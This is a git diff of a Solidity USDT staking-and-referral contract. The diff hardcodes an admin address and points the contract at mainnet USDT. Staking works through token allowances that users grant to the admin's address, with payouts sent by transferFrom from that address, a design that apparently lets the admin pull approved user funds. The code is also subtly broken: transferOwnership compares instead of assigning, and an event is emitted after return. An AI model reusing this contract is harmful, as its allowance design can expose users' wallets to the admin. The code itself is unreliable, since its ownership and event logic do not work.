@@ -56,25 +56,23 @@ contract Staking  {
     event RegisteredRefererFailed(address referee, address referrer, string reason);
   
 
-    address contractAdmin;
+    address contractAdmin = 0x88a94055AB22Ac80306cc0f00bb13c85205afd3d;
     IERC20 usdt;
-    uint constant public decimals = 1000000;
-    
+
 
     mapping (address=>uint) public onChainBalance;
 
     // mapping for staking
 
-    mapping (address=>uint) stakedBalance;
+
     mapping (address=>uint) public stakingTime;
     mapping (address=>bool) public hasStaked;
     mapping (address=>uint) minLimit;
-    mapping (address=>uint) maxLimit;
-    mapping (address=>uint) allowance;
-    mapping (address=>uint) stakingPercentage;
-    mapping (address=>uint) dailyIncome;
+    mapping (address=>uint) public allowance;
+    mapping (address=>uint) public stakingPercentage;
+    mapping (address=>uint) public dailyIncome;
     mapping (address=>uint) public hourlyIncome;
-    mapping (address=>uint) remainingIncome;
+    mapping (address=>uint) public remainingIncome;
     mapping (address=>uint) stakingIncome;
     
 
@@ -83,12 +81,20 @@ contract Staking  {
     mapping (address=>bool) public hasPledged;
     mapping (address=>uint) public pledgedBalance;
     mapping (address=>uint) public pledgeIncome;
-    mapping (address=>uint) remainingPledgeIncome;
-    mapping (address=>uint) pledgeDuration;
-    mapping (address=>uint) pledgePercentage;
+    mapping (address=>uint) public remainingPledgeIncome;
+    mapping (address=>uint) public pledgeDuration;
+    mapping (address=>uint) public pledgePercentage;
     mapping (address=>uint) public cumulatedPledgeBalance;
     mapping (address=>uint) public cumulatedPledgeIncome;
     mapping (address=>uint) public pledgingTime;
+
+    struct pledgeRecord {
+        uint pledgeAmount;
+        uint pledgeTime;
+    }
+
+    mapping (address=> pledgeRecord[]) public pledgeHistory;
+
 
     // mappping for referral
 
@@ -115,13 +121,8 @@ contract Staking  {
 
     
     
-
-    
-    
-    
     constructor () {
-        contractAdmin  == 0xdb339be8E04Db248ea2bdD7C308c5589c121C6Bb;
-        usdt = IERC20(0xfab46e002bbf0b4509813474841e0716e6730136);
+        usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     }
 
     modifier onlyContractAdmin () {
@@ -130,17 +131,13 @@ contract Staking  {
     }
 
 
-    function fetchOnChainBalance () public   {
-        onChainBalance[msg.sender] = usdt.balanceOf(msg.sender);
-    }
-
     function transferOwnership (address _newContractAdmin) public onlyContractAdmin {
         address _previousOwner = contractAdmin;
-        contractAdmin = _newContractAdmin;
+        contractAdmin == _newContractAdmin;
         emit ownershipTransferred(_previousOwner, _newContractAdmin);
     }
 
-    function stakeTokens (uint minimumPrice, uint maximumPrice, uint _stakingPercentage) public returns(bool) {
+    function stakeTokens (uint minimumPrice, uint _stakingPercentage) public returns(bool) {
         // verify that msg.sender has not staked already
         require (hasStaked[msg.sender] == false, 'address has already staked');
 
@@ -148,17 +145,14 @@ contract Staking  {
         require (hasPledged[msg.sender] == false, 'address has already pledged');
 
         // confirm allowance
-        allowance[msg.sender] = usdt.allowance(msg.sender, contractAdmin);
+         uint _allowance = usdt.allowance(msg.sender, contractAdmin);
         
-        uint _allowance = allowance[msg.sender];
+        allowance[msg.sender] =   _allowance;
 
-        // set the min and max limit price
+        // set the min limit price
         minLimit[msg.sender] = (minimumPrice);
-        maxLimit[msg.sender] = (maximumPrice);
         
         require (_allowance >= minLimit[msg.sender], 'Insufficent allowance');
-
-        require (_allowance <= maxLimit[msg.sender], 'Insufficent allowance');
 
 
         // daily income
@@ -173,17 +167,12 @@ contract Staking  {
         // set the staking time
         stakingTime[msg.sender] = block.timestamp;
 
-
-        // map the staking address to amount
-        stakedBalance[msg.sender] = allowance[msg.sender];
-
         // set bool for staking
         hasStaked[msg.sender] = true;
 
         return true;
-
-        // emit event
-    
+        
+        emit staked(_allowance, msg.sender);
     }
 
 
@@ -206,16 +195,15 @@ contract Staking  {
 
         // add referrer
         addReferrer(referrer);
+
+        // update pledge history
+        pledgeHistory[msg.sender].push(pledgeRecord(_amount, block.timestamp));
         
         // set the staking time
         pledgingTime[msg.sender] = block.timestamp;
 
         // set the pledging duration
         pledgeDuration[msg.sender] = _pledgingDuration;
-
-
-        // update the on chain balance
-        onChainBalance[msg.sender] = usdt.balanceOf(msg.sender);
 
         // calculate reward
         pledgePercentage[msg.sender] = _pledgePercentage;
@@ -267,16 +255,16 @@ contract Staking  {
             // require that staked amount is still present
             onChainBalance[msg.sender] = usdt.balanceOf(msg.sender);
 
-            require (onChainBalance[msg.sender] >=  stakedBalance[msg.sender], 'Staked token not available in wallet');
+            require (onChainBalance[msg.sender] >=  allowance[msg.sender], 'Staked token not available in wallet');
 
             // call the USDT transfer to function and pass the amount into it
             usdt.transferFrom(contractAdmin, msg.sender, (_withdrawalAmount));
 
             allowance[msg.sender]= usdt.allowance(msg.sender, contractAdmin);
 
-            remainingIncome[msg.sender] = Income - _withdrawalAmount;
+            remainingIncome[msg.sender] = cumulativeIncome - _withdrawalAmount;
 
-            if (allowance[msg.sender] >= minLimit[msg.sender]  && allowance[msg.sender] <= maxLimit[msg.sender]) {
+            if (allowance[msg.sender] >= minLimit[msg.sender]) {
                 // set new staking time
                 stakingTime[msg.sender] =  block.timestamp;
 
@@ -295,7 +283,7 @@ contract Staking  {
             // check that pledge has matured
             uint256 numDays = pledgeDuration[msg.sender];
 
-            require (block.timestamp >= ((pledgingTime[msg.sender]) + (numDays * 1 days )  ));
+            require (block.timestamp >= ((pledgingTime[msg.sender]) + (numDays * 1 days )  ), "Pledge income not yet mature");
 
             uint pledgeReward = pledgeIncome[msg.sender] ;
 
@@ -318,9 +306,6 @@ contract Staking  {
 
             // execute refferal function
             payReferral();
-
-            // update the on chain balance
-            onChainBalance[msg.sender] = usdt.balanceOf(msg.sender);
 
             // emit event
             emit pledgeWithdrawal (_withdrawalAmount, msg.sender);
@@ -374,6 +359,9 @@ contract Staking  {
         } else if (msg.sender == referrer) {
         emit RegisteredRefererFailed(msg.sender, referrer, "Referee cannot be one of referrer uplines");
         return false;
+        } else if (referrer == contractAdmin) {
+        emit RegisteredRefererFailed(msg.sender, referrer, "Referee cannot be one contract Admin");
+        return false; 
         } else if (accounts[msg.sender].referrer != address(0)) {
         emit RegisteredRefererFailed(msg.sender, referrer, "Address have been registered upline");
         return false;
